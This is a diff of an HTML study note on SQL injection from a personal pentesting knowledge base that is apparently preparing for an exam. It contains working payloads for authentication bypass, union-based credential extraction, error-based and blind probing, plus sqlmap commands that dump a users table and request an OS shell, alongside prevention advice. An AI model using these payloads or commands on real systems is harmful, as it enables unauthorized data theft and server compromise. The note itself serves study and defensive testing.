@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:55 -->
+<!-- 2026-07-30 Thu 22:13 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>SQL injection</title>
-<meta name="author" content="termux" />
+<title>SQL Injection</title>
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,161 +860,445 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
-<h1 class="title">SQL injection</h1>
+<h1 class="title">SQL Injection</h1>
 <div id="table-of-contents" role="doc-toc">
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgc4fd8fb">SQL Injection</a>
+<li><a href="#orgb12e9ee">Impact</a></li>
+<li><a href="#org08587ed">Identification</a></li>
+<li><a href="#orgef0adc5">Examples</a>
 <ul>
-<li><a href="#orgd48ede1">Description</a></li>
-<li><a href="#org10e6372">Impact</a></li>
-<li><a href="#org9286654">Prevention</a></li>
-<li><a href="#orgd24ab18">Examples</a>
+<li><a href="#orgc445eef">Basic — Authentication Bypass</a></li>
+<li><a href="#org208bd02">Union-Based — Extracting Data from Other Tables</a></li>
+<li><a href="#orgf5e4f48">Error-Based — Extracting Schema via Error Messages</a></li>
+<li><a href="#orgbcfc29f">Blind SQL Injection — No Visible Output</a>
 <ul>
-<li><a href="#orgeb5da22">Basic SQL Injection</a></li>
-<li><a href="#org64411b7">Union-Based SQL Injection</a></li>
-<li><a href="#orgb57d1a2">Error-Based SQL Injection</a></li>
+<li><a href="#org659fbbe">Boolean-Based Blind</a></li>
+<li><a href="#org112c6da">Time-Based Blind</a></li>
 </ul>
 </li>
 </ul>
 </li>
+<li><a href="#orga625b8b">Automation with sqlmap</a></li>
+<li><a href="#org87a8c70">Prevention (Defensive)</a></li>
+<li><a href="#org5cb5dee">Tips</a></li>
 </ul>
 </div>
 </div>
-<div id="outline-container-orgc4fd8fb" class="outline-2">
-<h2 id="orgc4fd8fb">SQL Injection</h2>
-<div class="outline-text-2" id="text-orgc4fd8fb">
-</div>
-<div id="outline-container-orgd48ede1" class="outline-3">
-<h3 id="orgd48ede1">Description</h3>
-<div class="outline-text-3" id="text-orgd48ede1">
 <p>
-SQL injection is a type of security vulnerability that occurs when malicious SQL statements are injected into an application, resulting in unauthorized access to or modification of data. This happens when user input is not properly sanitized or validated before being incorporated into SQL queries.
-</p>
-</div>
-</div>
-<div id="outline-container-org10e6372" class="outline-3">
-<h3 id="org10e6372">Impact</h3>
-<div class="outline-text-3" id="text-org10e6372">
-<p>
-The consequences of SQL injection can be severe, including:
+SQL injection is a vulnerability that occurs when user input is
+incorporated into a SQL query without proper sanitization or
+parameterization, allowing an attacker to alter the query's logic —
+resulting in unauthorized data access, authentication bypass, or in
+severe cases full database/system compromise.
 </p>
 
+<p>
+Related: <a href="20260611T065328--nosql-injection__cybersecurity_pentesting_technique.html">NoSQL Injection</a>
+         <a href="20260314T005611--broken-authentication__cybersecurity_technique.html">Broken Authentication</a>
+         <a href="20260207T065343==idor--insecure-direct-object-references__cybersecurity_technique.html">IDOR</a>
+         <a href="20260213T072057--denial-of-service__concept_cybersecurity_technique.html">Denial of Service</a>
+         <a href="20260213T072419--web-application-firewall__concept_cybersecurity.html">Web Application Firewall</a>
+         <a href="20260611T064753--web-application-testing-methodology__cybersecurity_pentesting_technique.html">Web Application Testing Methodology</a>
+         <a href="20260614T002010--pt1-vulnerability-classification-cheat-sheet__comparison_cybersecurity_pentesting_reference.html">PT1 Vulnerability Classification Cheat Sheet</a>
+</p>
+<div id="outline-container-orgb12e9ee" class="outline-2">
+<h2 id="orgb12e9ee">Impact</h2>
+<div class="outline-text-2" id="text-orgb12e9ee">
 <ul class="org-ul">
-<li></li>
-
-<li>Data Exposure: Unauthorized access to sensitive information.</li>
-<li>System Compromise: Gaining control over the database server.</li>
-<li><a href="Denial of Service.html#denial-of-service">Denial of Service</a> (DoS): Preventing legitimate users from accessing the database.</li>
+<li><b>Data Exposure:</b> Unauthorized access to sensitive information</li>
+<li><b>Authentication Bypass:</b> Logging in without valid credentials
+(see Basic example below)</li>
+<li><b>System Compromise:</b> Gaining control over the database server, or
+further via database-specific RCE features</li>
+<li><b><a href="20260213T072057--denial-of-service__concept_cybersecurity_technique.html">Denial of Service</a>:</b> Preventing
+legitimate users from accessing the database</li>
 </ul>
 </div>
 </div>
-<div id="outline-container-org9286654" class="outline-3">
-<h3 id="org9286654">Prevention</h3>
-<div class="outline-text-3" id="text-org9286654">
-<ul class="org-ul">
-<li>Parameterized Queries: Using parameterized queries or prepared statements to isolate user input from the SQL query.</li>
-<li>Input Validation: Strictly validating and sanitizing all user-provided data.</li>
-<li></li>
-
-<li>Regular Security Audits: Conducting vulnerability assessments to identify potential weaknesses.</li>
-<li>Web Application Firewalls (<a href="Web Application Firewal.html#web-application-firewal">Web Application Firewal</a>): Deploying WAFs to protect against SQL injection attacks.</li>
-<li>Stored Procedures: Using stored procedures to encapsulate database logic and reduce attack surface.</li>
-</ul>
-</div>
-</div>
-<div id="outline-container-orgd24ab18" class="outline-3">
-<h3 id="orgd24ab18">Examples</h3>
-<div class="outline-text-3" id="text-orgd24ab18">
-</div>
-<div id="outline-container-orgeb5da22" class="outline-4">
-<h4 id="orgeb5da22">Basic SQL Injection</h4>
-<div class="outline-text-4" id="text-orgeb5da22">
+<div id="outline-container-org08587ed" class="outline-2">
+<h2 id="org08587ed">Identification</h2>
+<div class="outline-text-2" id="text-org08587ed">
 <p>
-Consider a login form where a user inputs their username and password. The application might construct a SQL query like this:
+Before exploitation — confirm the injection point exists:
 </p>
 
-<p>
-<code>SELECT * FROM users WHERE username = '[[file:username.org][username]]' AND password = '[[file:password.org][password]]'</code>
-</p>
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>HTTP</span><button class='copyBtn' name=btn_8490f6534fcc4c7498c891088e0ff821>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_8490f6534fcc4c7498c891088e0ff821=document.querySelector('button[name=btn_8490f6534fcc4c7498c891088e0ff821]');
+copyBtnbtn_8490f6534fcc4c7498c891088e0ff821.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Single quote often breaks the query and errors, confirming injection\nGET /product?id=1'\nGET /product?id=1'' -- comment out the rest\n\n# Boolean-based comparison — behavior should differ between these two\nGET /product?id=1 AND 1=1\nGET /product?id=1 AND 1=2\n`);copyBtnbtn_8490f6534fcc4c7498c891088e0ff821.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8490f6534fcc4c7498c891088e0ff821.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-http"># Single quote often breaks the query and errors, confirming injection
+GET /product?id=1'
+GET /product?id=1'' -- comment out the rest
+
+# Boolean-based comparison — behavior should differ between these two
+GET /product?id=1 AND 1=1
+GET /product?id=1 AND 1=2
+</pre>
+</div></div>
 
 <p>
-If a malicious user enters <code>admin' OR '1'</code>'1= for the username, the query becomes:
-</p>
-
-<p>
-<code>SELECT * FROM users WHERE username = 'admin' OR '1'</code>'1' AND password = '<a href="password.html">password</a>'=
-</p>
-
-<p>
-Since <code>'1'</code>'1'= is always true, the query effectively bypasses authentication and logs the user in as 'admin' (or the first user in the database).
+A differing response (error message, different content, different
+status code) between the <code>1=1</code> and <code>1=2</code> variants confirms the
+parameter is unsanitized and reaches the SQL query directly.
 </p>
 </div>
 </div>
-<div id="outline-container-org64411b7" class="outline-4">
-<h4 id="org64411b7">Union-Based SQL Injection</h4>
-<div class="outline-text-4" id="text-org64411b7">
+<div id="outline-container-orgef0adc5" class="outline-2">
+<h2 id="orgef0adc5">Examples</h2>
+<div class="outline-text-2" id="text-orgef0adc5">
+</div>
+<div id="outline-container-orgc445eef" class="outline-3">
+<h3 id="orgc445eef">Basic — Authentication Bypass</h3>
+<div class="outline-text-3" id="text-orgc445eef">
 <p>
-This technique is used to extract data from other tables in the database. If an application is vulnerable, an attacker might use the UNION operator to combine the results of the original query with a query that retrieves data from another table.
+Consider a login form where a user inputs their username and
+password. The application might construct a SQL query like this:
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SQL</span><button class='copyBtn' name=btn_8923116fc92f479fad88aa121ce53c61>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_8923116fc92f479fad88aa121ce53c61=document.querySelector('button[name=btn_8923116fc92f479fad88aa121ce53c61]');
+copyBtnbtn_8923116fc92f479fad88aa121ce53c61.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`SELECT * FROM users WHERE username = '$username' AND password = '$password'\n`);copyBtnbtn_8923116fc92f479fad88aa121ce53c61.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8923116fc92f479fad88aa121ce53c61.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-sql"><span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">SELECT</span> * <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">FROM</span> users <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">WHERE</span> username = <span style="color: var(--clr-string); background-color: var(--bg-string);">'$username'</span> <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">AND</span> password = <span style="color: var(--clr-string); background-color: var(--bg-string);">'$password'</span>
+</pre>
+</div></div>
+
+<p>
+If a malicious user enters <code>admin' OR '1'</code>'1= for the username, the
+query becomes:
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SQL</span><button class='copyBtn' name=btn_1d8b857e31c44f5b81de1bd590867b9e>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_1d8b857e31c44f5b81de1bd590867b9e=document.querySelector('button[name=btn_1d8b857e31c44f5b81de1bd590867b9e]');
+copyBtnbtn_1d8b857e31c44f5b81de1bd590867b9e.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '$password'\n`);copyBtnbtn_1d8b857e31c44f5b81de1bd590867b9e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1d8b857e31c44f5b81de1bd590867b9e.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-sql"><span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">SELECT</span> * <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">FROM</span> users <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">WHERE</span> username = <span style="color: var(--clr-string); background-color: var(--bg-string);">'admin'</span> <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">OR</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">'1'</span>=<span style="color: var(--clr-string); background-color: var(--bg-string);">'1'</span> <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">AND</span> password = <span style="color: var(--clr-string); background-color: var(--bg-string);">'$password'</span>
+</pre>
+</div></div>
+
+<p>
+Since <code>OR '1'</code>'1'= is always true, the query effectively bypasses
+authentication and logs the user in as 'admin' (or the first user
+in the database, depending on how the application handles multiple
+matched rows).
+</p>
+</div>
+</div>
+<div id="outline-container-org208bd02" class="outline-3">
+<h3 id="org208bd02">Union-Based — Extracting Data from Other Tables</h3>
+<div class="outline-text-3" id="text-org208bd02">
+<p>
+Used to extract data from other tables by appending a <code>UNION
+SELECT</code> to the original query. Requires the column count and data
+types in the injected query to match the original.
 </p>
 
 <p>
-For example, if the original query is:
+If the original query is:
 </p>
 
-<p>
-<code>SELECT product_name, description FROM products WHERE id = [[file:id.org][id]]</code>
-</p>
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SQL</span><button class='copyBtn' name=btn_43b7a2e7a4c4476db8cbb2da4c7eaa2c>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_43b7a2e7a4c4476db8cbb2da4c7eaa2c=document.querySelector('button[name=btn_43b7a2e7a4c4476db8cbb2da4c7eaa2c]');
+copyBtnbtn_43b7a2e7a4c4476db8cbb2da4c7eaa2c.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`SELECT product_name, description FROM products WHERE id = $id\n`);copyBtnbtn_43b7a2e7a4c4476db8cbb2da4c7eaa2c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_43b7a2e7a4c4476db8cbb2da4c7eaa2c.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-sql"><span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">SELECT</span> product_name, description <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">FROM</span> products <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">WHERE</span> id = $id
+</pre>
+</div></div>
 
 <p>
 An attacker could inject:
 </p>
 
-<p>
-<code>1 UNION SELECT username, password FROM users</code>
-</p>
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SQL</span><button class='copyBtn' name=btn_486972981ea34fca94058c2f180bdb46>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_486972981ea34fca94058c2f180bdb46=document.querySelector('button[name=btn_486972981ea34fca94058c2f180bdb46]');
+copyBtnbtn_486972981ea34fca94058c2f180bdb46.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`1 UNION SELECT username, password FROM users\n`);copyBtnbtn_486972981ea34fca94058c2f180bdb46.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_486972981ea34fca94058c2f180bdb46.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-sql">1 <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">UNION</span> <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">SELECT</span> username, password <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">FROM</span> users
+</pre>
+</div></div>
 
 <p>
-Which would result in a query like:
+Resulting in:
 </p>
 
-<p>
-<code>SELECT product_name, description FROM products WHERE id = 1 UNION SELECT username, password FROM users</code>
-</p>
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SQL</span><button class='copyBtn' name=btn_0f8452b1a13f490b8d4791be9afcf3da>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_0f8452b1a13f490b8d4791be9afcf3da=document.querySelector('button[name=btn_0f8452b1a13f490b8d4791be9afcf3da]');
+copyBtnbtn_0f8452b1a13f490b8d4791be9afcf3da.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`SELECT product_name, description FROM products WHERE id = 1 UNION SELECT username, password FROM users\n`);copyBtnbtn_0f8452b1a13f490b8d4791be9afcf3da.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0f8452b1a13f490b8d4791be9afcf3da.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-sql"><span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">SELECT</span> product_name, description <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">FROM</span> products <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">WHERE</span> id = 1 <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">UNION</span> <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">SELECT</span> username, password <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">FROM</span> users
+</pre>
+</div></div>
 
 <p>
-This would display usernames and passwords from the <code>users</code> table instead of product information.
+This displays usernames and passwords from the <code>users</code> table in the
+same response fields normally used for product name/description.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>HTTP</span><button class='copyBtn' name=btn_ae29ecfe1bcd4f22a2d7857127d0a655>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_ae29ecfe1bcd4f22a2d7857127d0a655=document.querySelector('button[name=btn_ae29ecfe1bcd4f22a2d7857127d0a655]');
+copyBtnbtn_ae29ecfe1bcd4f22a2d7857127d0a655.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# First: determine the number of columns via ORDER BY\nGET /product?id=1 ORDER BY 1--\nGET /product?id=1 ORDER BY 2--\nGET /product?id=1 ORDER BY 3--  # error here = 2 columns in original query\n\n# Then: identify which columns reflect in the response\nGET /product?id=-1 UNION SELECT 'a','b'--\n\n# Finally: extract real data into the reflecting columns\nGET /product?id=-1 UNION SELECT username,password FROM users--\n`);copyBtnbtn_ae29ecfe1bcd4f22a2d7857127d0a655.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ae29ecfe1bcd4f22a2d7857127d0a655.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-http"># First: determine the number of columns via ORDER BY
+GET /product?id=1 ORDER BY 1--
+GET /product?id=1 ORDER BY 2--
+GET /product?id=1 ORDER BY 3--  # error here = 2 columns in original query
+
+# Then: identify which columns reflect in the response
+GET /product?id=-1 UNION SELECT 'a','b'--
+
+# Finally: extract real data into the reflecting columns
+GET /product?id=-1 UNION SELECT username,password FROM users--
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgf5e4f48" class="outline-3">
+<h3 id="orgf5e4f48">Error-Based — Extracting Schema via Error Messages</h3>
+<div class="outline-text-3" id="text-orgf5e4f48">
+<p>
+Deliberately triggering a malformed query to leak schema
+information through verbose error messages.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SQL</span><button class='copyBtn' name=btn_4ae186343c914eb19a60cc104cc5b396>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_4ae186343c914eb19a60cc104cc5b396=document.querySelector('button[name=btn_4ae186343c914eb19a60cc104cc5b396]');
+copyBtnbtn_4ae186343c914eb19a60cc104cc5b396.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`' AND (SELECT 0 FROM users WHERE 1=0) --\n`);copyBtnbtn_4ae186343c914eb19a60cc104cc5b396.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_4ae186343c914eb19a60cc104cc5b396.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-sql"><span style="color: var(--clr-string); background-color: var(--bg-string);">' AND (SELECT 0 FROM users WHERE 1=0) --</span>
+</pre>
+</div></div>
+
+<p>
+If the database throws an error referencing the <code>users</code> table
+(rather than a generic error), that confirms the table's existence
+— repeatable against guessed table/column names to enumerate schema
+blind, one confirmed name at a time.
 </p>
 </div>
 </div>
-<div id="outline-container-orgb57d1a2" class="outline-4">
-<h4 id="orgb57d1a2">Error-Based SQL Injection</h4>
-<div class="outline-text-4" id="text-orgb57d1a2">
+<div id="outline-container-orgbcfc29f" class="outline-3">
+<h3 id="orgbcfc29f">Blind SQL Injection — No Visible Output</h3>
+<div class="outline-text-3" id="text-orgbcfc29f">
 <p>
-In some cases, the database server might return error messages that contain sensitive information, such as table names, column names, or even data. An attacker can intentionally trigger these errors to gather information about the database schema.
+When the application doesn't reflect query results or errors
+directly, infer data one bit/character at a time.
+</p>
+</div>
+<div id="outline-container-org659fbbe" class="outline-4">
+<h4 id="org659fbbe">Boolean-Based Blind</h4>
+<div class="outline-text-4" id="text-org659fbbe">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>HTTP</span><button class='copyBtn' name=btn_5ee4ff8060bc4affbbb7ce9afa67b7ef>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_5ee4ff8060bc4affbbb7ce9afa67b7ef=document.querySelector('button[name=btn_5ee4ff8060bc4affbbb7ce9afa67b7ef]');
+copyBtnbtn_5ee4ff8060bc4affbbb7ce9afa67b7ef.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# True condition — page behaves normally\nGET /product?id=1 AND 1=1\n\n# False condition — page behaves differently (missing content, different length)\nGET /product?id=1 AND 1=2\n\n# Extracting data character by character via conditional true/false\nGET /product?id=1 AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'\n`);copyBtnbtn_5ee4ff8060bc4affbbb7ce9afa67b7ef.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_5ee4ff8060bc4affbbb7ce9afa67b7ef.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-http"># True condition — page behaves normally
+GET /product?id=1 AND 1=1
+
+# False condition — page behaves differently (missing content, different length)
+GET /product?id=1 AND 1=2
+
+# Extracting data character by character via conditional true/false
+GET /product?id=1 AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org112c6da" class="outline-4">
+<h4 id="org112c6da">Time-Based Blind</h4>
+<div class="outline-text-4" id="text-org112c6da">
+<p>
+Used when there's no observable difference in response
+content/behavior at all — infer truth via response delay instead.
 </p>
 
-<p>
-For example, by injecting a malformed query like:
-</p>
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>HTTP</span><button class='copyBtn' name=btn_323eb1170cb341cdbf77522f6db4f488>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_323eb1170cb341cdbf77522f6db4f488=document.querySelector('button[name=btn_323eb1170cb341cdbf77522f6db4f488]');
+copyBtnbtn_323eb1170cb341cdbf77522f6db4f488.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`GET /product?id=1 AND IF(1=1, SLEEP(5), 0)\nGET /product?id=1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--  -- PostgreSQL\n`);copyBtnbtn_323eb1170cb341cdbf77522f6db4f488.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_323eb1170cb341cdbf77522f6db4f488.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-http">GET /product?id=1 AND IF(1=1, SLEEP(5), 0)
+GET /product?id=1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--  -- PostgreSQL
+</pre>
+</div></div>
 
 <p>
-<code>' AND (SELECT 0 FROM users WHERE 1=0) --</code>
-</p>
-
-<p>
-The database might throw an error revealing that the <code>users</code> table exists.
+A 5-second delay confirms the injected condition evaluated true —
+slow to enumerate manually, this is where sqlmap's automation
+becomes essential rather than optional.
 </p>
 </div>
 </div>
+</div>
+</div>
+<div id="outline-container-orga625b8b" class="outline-2">
+<h2 id="orga625b8b">Automation with sqlmap</h2>
+<div class="outline-text-2" id="text-orga625b8b">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b5d4a3e202584bca84cccef62813469c>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_b5d4a3e202584bca84cccef62813469c=document.querySelector('button[name=btn_b5d4a3e202584bca84cccef62813469c]');
+copyBtnbtn_b5d4a3e202584bca84cccef62813469c.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Basic test against a GET parameter\nsqlmap -u \"http://target.com/product?id=1\" --batch\n\n# Test a POST request captured from Burp\nsqlmap -r request.txt --batch\n\n# Once injection is confirmed, enumerate databases/tables/data\nsqlmap -u \"http://target.com/product?id=1\" --dbs\nsqlmap -u \"http://target.com/product?id=1\" -D targetdb --tables\nsqlmap -u \"http://target.com/product?id=1\" -D targetdb -T users --dump\n\n# Attempt OS command execution if DB privileges allow (MySQL: FILE priv, etc.)\nsqlmap -u \"http://target.com/product?id=1\" --os-shell\n`);copyBtnbtn_b5d4a3e202584bca84cccef62813469c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b5d4a3e202584bca84cccef62813469c.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Basic test against a GET parameter
+</span>sqlmap -u <span style="color: var(--clr-string); background-color: var(--bg-string);">"http://target.com/product?id=1"</span> --batch
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Test a POST request captured from Burp
+</span>sqlmap -r request.txt --batch
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Once injection is confirmed, enumerate databases/tables/data
+</span>sqlmap -u <span style="color: var(--clr-string); background-color: var(--bg-string);">"http://target.com/product?id=1"</span> --dbs
+sqlmap -u <span style="color: var(--clr-string); background-color: var(--bg-string);">"http://target.com/product?id=1"</span> -D targetdb --tables
+sqlmap -u <span style="color: var(--clr-string); background-color: var(--bg-string);">"http://target.com/product?id=1"</span> -D targetdb -T users --dump
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Attempt OS command execution if DB privileges allow (MySQL: FILE priv, etc.)
+</span>sqlmap -u <span style="color: var(--clr-string); background-color: var(--bg-string);">"http://target.com/product?id=1"</span> --os-shell
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org87a8c70" class="outline-2">
+<h2 id="org87a8c70">Prevention (Defensive)</h2>
+<div class="outline-text-2" id="text-org87a8c70">
+<ul class="org-ul">
+<li><b>Parameterized Queries:</b> Using parameterized queries or prepared
+statements to isolate user input from the SQL query structure —
+the primary and most robust defense</li>
+<li><b>Input Validation:</b> Strictly validating and sanitizing all
+user-provided data as a secondary layer, not a substitute for
+parameterization</li>
+<li><b>Least Privilege:</b> Database accounts used by the application
+should have the minimum privileges needed — limits blast radius
+even if injection occurs</li>
+<li><b>Regular Security Audits:</b> Conducting vulnerability assessments
+to identify potential weaknesses</li>
+<li><b><a href="20260213T072419--web-application-firewall__concept_cybersecurity.html">Web Application Firewall</a>:</b>
+Deploying WAFs as a detection/mitigation layer — not a substitute
+for fixing the underlying query construction</li>
+<li><b>Stored Procedures:</b> Using stored procedures to encapsulate
+database logic, though these can still be vulnerable if they
+concatenate input internally rather than parameterizing it too</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org5cb5dee" class="outline-2">
+<h2 id="org5cb5dee">Tips</h2>
+<div class="outline-text-2" id="text-org5cb5dee">
+<ul class="org-ul">
+<li>On the exam, always attempt manual confirmation (single quote,
+boolean true/false comparison) before reaching for sqlmap —
+understanding <b>why</b> it's injectable matters for the report, and
+manual confirmation is faster for simple cases than waiting on
+automated enumeration</li>
+<li>If a target uses MongoDB or another non-relational database
+instead, this entire methodology doesn't apply — see
+<a href="20260611T065328--nosql-injection__cybersecurity_pentesting_technique.html">NoSQL Injection</a> for the operator-based
+equivalent</li>
+<li>Time-based blind injection is slow and noisy (many requests) —
+confirm boolean-based blind isn't viable first, since it's faster
+to enumerate when available</li>
+<li>A SQLi-based authentication bypass should be classified as SQL
+Injection with an authentication-bypass <b>impact</b>, not as a Broken
+Authentication finding with an injection <b>cause</b> — see the PT1
+Vulnerability Classification Cheat Sheet for this exact
+disambiguation</li>
+<li><code>sqlmap --os-shell</code> only works if the database user has file-write
+privileges (e.g. MySQL's <code>FILE</code> privilege) — don't expect it to
+work universally, check privilege level first if RCE via SQLi is
+the goal</li>
+</ul>
 </div>
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -1022,6 +1306,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
